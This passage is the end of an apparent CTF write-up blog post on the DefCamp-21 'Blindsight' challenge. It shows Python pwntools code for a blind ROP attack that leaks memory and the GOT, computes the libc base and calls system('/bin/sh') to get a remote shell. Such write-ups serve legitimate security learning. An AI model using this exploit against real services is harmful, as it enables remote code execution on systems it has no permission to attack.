        <span class="k">print</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">pwn</span><span class="p">.</span><span class="n">unpack</span><span class="p">(</span><span class="n">mssg</span><span class="p">,</span> <span class="s">'all'</span><span class="p">)))</span>
        <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">mssg</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
            <span class="n">f</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="sa">b</span><span class="s">'</span><span class="se">\x00</span><span class="s">'</span><span class="p">)</span>
            <span class="n">offset</span> <span class="o">+=</span> <span class="mi">1</span>
        <span class="k">else</span><span class="p">:</span>
            <span class="n">f</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="n">mssg</span><span class="p">)</span>
            <span class="n">offset</span> <span class="o">+=</span> <span class="nb">len</span><span class="p">(</span><span class="n">mssg</span><span class="p">)</span>
        <span class="n">io</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>
        <span class="n">f</span><span class="p">.</span><span class="n">flush</span><span class="p">()</span>


<span class="k">def</span> <span class="nf">LeakGOT</span><span class="p">():</span>
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mh">0x600000</span><span class="p">,</span> <span class="mh">0x600000</span><span class="o">+</span><span class="mh">0x4000</span><span class="p">,</span> <span class="mi">8</span><span class="p">):</span>
        <span class="n">io</span> <span class="o">=</span> <span class="n">pwn</span><span class="p">.</span><span class="n">remote</span><span class="p">(</span><span class="n">HOST</span><span class="p">,</span> <span class="n">PORT</span><span class="p">,</span> <span class="n">level</span><span class="o">=</span><span class="s">'critical'</span><span class="p">)</span>
        <span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s">'A'</span><span class="o">*</span><span class="n">OFFSET</span>
        <span class="n">payload</span> <span class="o">+=</span> <span class="n">pwn</span><span class="p">.</span><span class="n">p64</span><span class="p">(</span><span class="n">BROP_GADGET</span> <span class="o">+</span> <span class="mi">9</span><span class="p">)</span>  <span class="c1"># pop rdi
</span>        <span class="n">payload</span> <span class="o">+=</span> <span class="n">pwn</span><span class="p">.</span><span class="n">p64</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>
        <span class="n">payload</span> <span class="o">+=</span> <span class="n">pwn</span><span class="p">.</span><span class="n">p64</span><span class="p">(</span><span class="n">CALL_PUTS</span><span class="p">)</span>
        <span class="n">io</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">"?</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
        <span class="n">io</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
        <span class="n">mssg</span> <span class="o">=</span> <span class="n">io</span><span class="p">.</span><span class="n">recvall</span><span class="p">().</span><span class="n">strip</span><span class="p">()</span>
        <span class="k">if</span> <span class="sa">b</span><span class="s">'</span><span class="se">\x7f</span><span class="s">'</span> <span class="ow">in</span> <span class="n">mssg</span><span class="p">:</span>
            <span class="n">pwn</span><span class="p">.</span><span class="n">log</span><span class="p">.</span><span class="n">success</span><span class="p">(</span><span class="s">"Found Possible GOT at: "</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">i</span><span class="p">))</span>
            <span class="n">io</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>
        <span class="n">io</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>


<span class="k">def</span> <span class="nf">scanQWORD</span><span class="p">(</span><span class="n">l</span><span class="p">):</span>
    <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="n">l</span><span class="p">:</span>
        <span class="n">io</span> <span class="o">=</span> <span class="n">pwn</span><span class="p">.</span><span class="n">remote</span><span class="p">(</span><span class="n">HOST</span><span class="p">,</span> <span class="n">PORT</span><span class="p">,</span> <span class="n">level</span><span class="o">=</span><span class="s">'critical'</span><span class="p">)</span>
        <span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s">'A'</span><span class="o">*</span><span class="n">OFFSET</span>
        <span class="n">payload</span> <span class="o">+=</span> <span class="n">pwn</span><span class="p">.</span><span class="n">p64</span><span class="p">(</span><span class="n">BROP_GADGET</span> <span class="o">+</span> <span class="mi">9</span><span class="p">)</span>  <span class="c1"># pop rdi
</span>        <span class="n">payload</span> <span class="o">+=</span> <span class="n">pwn</span><span class="p">.</span><span class="n">p64</span><span class="p">(</span><span class="n">x</span><span class="p">)</span>
        <span class="n">payload</span> <span class="o">+=</span> <span class="n">pwn</span><span class="p">.</span><span class="n">p64</span><span class="p">(</span><span class="n">CALL_PUTS</span><span class="p">)</span>
        <span class="n">io</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">"?</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
        <span class="n">io</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
        <span class="n">mssg</span> <span class="o">=</span> <span class="n">io</span><span class="p">.</span><span class="n">recvall</span><span class="p">().</span><span class="n">strip</span><span class="p">()</span>
        <span class="n">mssg</span> <span class="o">=</span> <span class="n">mssg</span><span class="p">[</span><span class="mi">0</span><span class="p">:</span><span class="mi">8</span><span class="p">]</span>
        <span class="n">mssg</span> <span class="o">=</span> <span class="n">pwn</span><span class="p">.</span><span class="n">unpack</span><span class="p">(</span><span class="n">mssg</span><span class="p">,</span> <span class="s">'all'</span><span class="p">)</span>
        <span class="n">pwn</span><span class="p">.</span><span class="n">log</span><span class="p">.</span><span class="n">success</span><span class="p">(</span><span class="s">"QWORD @ Memory -"</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">x</span><span class="p">)</span> <span class="o">+</span> <span class="s">": "</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">mssg</span><span class="p">))</span>
        <span class="n">io</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>


<span class="k">def</span> <span class="nf">exploit</span><span class="p">():</span>
    <span class="n">io</span> <span class="o">=</span> <span class="n">pwn</span><span class="p">.</span><span class="n">remote</span><span class="p">(</span><span class="n">HOST</span><span class="p">,</span> <span class="n">PORT</span><span class="p">)</span>
    <span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s">'A'</span><span class="o">*</span><span class="n">OFFSET</span>
    <span class="n">payload</span> <span class="o">+=</span> <span class="n">pwn</span><span class="p">.</span><span class="n">p64</span><span class="p">(</span><span class="n">BROP_GADGET</span> <span class="o">+</span> <span class="mi">9</span><span class="p">)</span>  <span class="c1"># pop rdi
</span>    <span class="n">payload</span> <span class="o">+=</span> <span class="n">pwn</span><span class="p">.</span><span class="n">p64</span><span class="p">(</span><span class="n">PUTS_GOT</span><span class="p">)</span>
    <span class="n">payload</span> <span class="o">+=</span> <span class="n">pwn</span><span class="p">.</span><span class="n">p64</span><span class="p">(</span><span class="n">CALL_PUTS</span><span class="p">)</span>
    <span class="n">payload</span> <span class="o">+=</span> <span class="n">pwn</span><span class="p">.</span><span class="n">p64</span><span class="p">(</span><span class="n">LOOPBACK_FUNC</span><span class="p">)</span>
    <span class="n">io</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">"?</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
    <span class="n">io</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
    <span class="n">leak</span> <span class="o">=</span> <span class="n">io</span><span class="p">.</span><span class="n">recvline</span><span class="p">().</span><span class="n">strip</span><span class="p">()</span>
    <span class="n">leak</span> <span class="o">=</span> <span class="n">pwn</span><span class="p">.</span><span class="n">unpack</span><span class="p">(</span><span class="n">leak</span><span class="p">,</span> <span class="s">'all'</span><span class="p">)</span>
    <span class="n">pwn</span><span class="p">.</span><span class="n">log</span><span class="p">.</span><span class="n">success</span><span class="p">(</span><span class="s">"Puts Leak: "</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">leak</span><span class="p">))</span>
    <span class="n">libc</span><span class="p">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">leak</span> <span class="o">-</span> <span class="n">libc</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">'puts'</span><span class="p">]</span>
    <span class="n">pwn</span><span class="p">.</span><span class="n">log</span><span class="p">.</span><span class="n">success</span><span class="p">(</span><span class="s">"Libc Address: "</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="n">address</span><span class="p">))</span>
    <span class="n">io</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">"?</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
    <span class="n">binsh</span> <span class="o">=</span> <span class="nb">next</span><span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="n">search</span><span class="p">(</span><span class="sa">b</span><span class="s">'/bin/sh</span><span class="se">\0</span><span class="s">'</span><span class="p">))</span>
    <span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s">'A'</span><span class="o">*</span><span class="n">OFFSET</span>
    <span class="n">payload</span> <span class="o">+=</span> <span class="n">pwn</span><span class="p">.</span><span class="n">p64</span><span class="p">(</span><span class="n">BROP_GADGET</span> <span class="o">+</span> <span class="mi">9</span><span class="p">)</span>  <span class="c1"># pop rdi
</span>    <span class="n">payload</span> <span class="o">+=</span> <span class="n">pwn</span><span class="p">.</span><span class="n">p64</span><span class="p">(</span><span class="n">binsh</span><span class="p">)</span>
    <span class="n">payload</span> <span class="o">+=</span> <span class="n">pwn</span><span class="p">.</span><span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">[</span><span class="s">'system'</span><span class="p">])</span>
    <span class="n">io</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
    <span class="n">io</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>


<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">"__main__"</span><span class="p">:</span>
    <span class="c1"># len = GetRipOffset()
</span>    <span class="c1"># print(BruteRip())
</span>    <span class="c1"># ScanText()
</span>    <span class="c1"># print(FindBropGadget())
</span>    <span class="c1"># CheckBROP()
</span>    <span class="c1"># print(FindLeakFunc())
</span>    <span class="c1"># LeakELF()
</span>    <span class="c1"># LeakGOT()
</span>    <span class="c1">#scanQWORD([0x600000, 0x600288, 0x600ef0, #0x601010, 0x601018,
</span>              <span class="mh">0x601020</span><span class="p">,</span> <span class="mh">0x601028</span><span class="p">,</span> <span class="mh">0x601030</span><span class="p">,</span> <span class="mh">0x601038</span><span class="p">,</span> <span class="mh">0x601070</span><span class="p">,</span> <span class="mh">0x601080</span><span class="p">])</span>
    <span class="n">exploit</span><span class="p">()</span>
    <span class="c1"># Test()
</span></pre></table></code></div></div></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/pwn/'>Pwn</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/pwn/" class="post-tag no-text-decoration" >pwn</a> <a href="/tags/brop/" class="post-tag no-text-decoration" >BROP</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=DefCamp-21 Blindsight Writeup - EsharkyTheGreat's Personal Blog&url=/posts/DefCamp-21-Blindsight/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=DefCamp-21 Blindsight Writeup - EsharkyTheGreat's Personal Blog&u=/posts/DefCamp-21-Blindsight/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://telegram.me/share?text=DefCamp-21 Blindsight Writeup - EsharkyTheGreat's Personal Blog&url=/posts/DefCamp-21-Blindsight/" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copy link" title-succeed="Link copied successfully!"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down"><div class="access"><div id="access-lastmod" class="post"> <span>Recent Update</span><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/DefCamp-21-Blindsight/">DefCamp-21 Blindsight Writeup</a><li><a href="/posts/pwn-adventure-part3/">PwnAdventure Part3 - Memory and Structs</a><li><a href="/posts/pwn-adventure-part2/">PwnAdventure Part2 - Recon</a><li><a href="/posts/pwn-adventure-part1/">PwnAdventure Part1 - Setup</a><li><a href="/posts/First-Post/">First Test Post</a></ul></div><div id="access-tags"> <span>Trending Tags</span><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/pwn/">pwn</a> <a class="post-tag" href="/tags/game-hacking/">game hacking</a> <a class="post-tag" href="/tags/dlsym/">dlsym</a> <a class="post-tag" href="/tags/ld-preload/">LD_PRELOAD</a> <a class="post-tag" href="/tags/bof/">bof</a> <a class="post-tag" href="/tags/brop/">BROP</a> <a class="post-tag" href="/tags/c/">c++</a> <a class="post-tag" href="/tags/fork/">fork</a> <a class="post-tag" href="/tags/gdb/">gdb</a> <a class="post-tag" href="/tags/kernel/">Kernel</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"> <span class="pl-3 pt-2 mb-2">Contents</span><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="post-extend-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/First-Post/"><div class="card-body"> <span class="timeago small" >Dec 27, 2021<i class="unloaded">2021-12-27T19:21:00+05:30</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>First Test Post</h3><div class="text-muted small"><p> Welcome Hello world, this is my first Jekyll blog post. I hope you like it! key: value console.log("Hello World!"); #include&lt;stdio.h&gt; int main() { int a = 5; printf("%d",a); ...</p></div></div></a></div><div class="card"> <a href="/posts/fork-leak-canary/"><div class="card-body"> <span class="timeago small" >Jan 19<i class="unloaded">2022-01-19T10:05:00+05:30</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Bypass Canary in a Network Forking Service</h3><div class="text-muted small"><p> How to Bypass Stack Canary in a Network Forking Service What is a Stack Canary ? Stack Canary is a mitigation introduced to prevent buffer overflows. It is a random value placed on the stack wh...</p></div></div></a></div><div class="card"> <a href="/posts/pwn-adventure-part1/"><div class="card-body"> <span class="timeago small" >Jan 19<i class="unloaded">2022-01-19T12:02:00+05:30</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>PwnAdventure Part1 - Setup</h3><div class="text-muted small"><p> What is this series about ? I recently came across LiverOverflow’s youtube series on PwnAdventure3. I got interested in this because it involves game hacking which I think is very cool. Please ...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/pwn-adventure-part5/" class="btn btn-outline-primary" prompt="Older"><p>PwnAdventure Part5 - More Hacks!!</p></a> <a href="/posts/CakeCTF-2022-welkerme/" class="btn btn-outline-primary" prompt="Newer"><p>CakeCTF-22 Pwn welkerme</p></a></div></div></div></div><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center"><div class="footer-left"><p class="mb-0"> © 2022 <a href="https://twitter.com/eshwars1210">EsharkyTheGreat</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><h4 class="text-muted mb-4">Trending Tags</h4><a class="post-tag" href="/tags/pwn/">pwn</a> <a class="post-tag" href="/tags/game-hacking/">game hacking</a> <a class="post-tag" href="/tags/dlsym/">dlsym</a> <a class="post-tag" href="/tags/ld-preload/">LD_PRELOAD</a> <a class="post-tag" href="/tags/bof/">bof</a> <a class="post-tag" href="/tags/brop/">BROP</a> <a class="post-tag" href="/tags/c/">c++</a> <a class="post-tag" href="/tags/fork/">fork</a> <a class="post-tag" href="/tags/gdb/">gdb</a> <a class="post-tag" href="/tags/kernel/">Kernel</a></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/lozad/dist/lozad.min.js,npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.16.1,npm/bootstrap@4/dist/js/bootstrap.min.js"></script> <script defer src="/app.js"></script> <script defer src="https://www.googletagmanager.com/gtag/js?id="></script> <script> document.addEventListener("DOMContentLoaded", function(event) { window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', ''); }); </script>
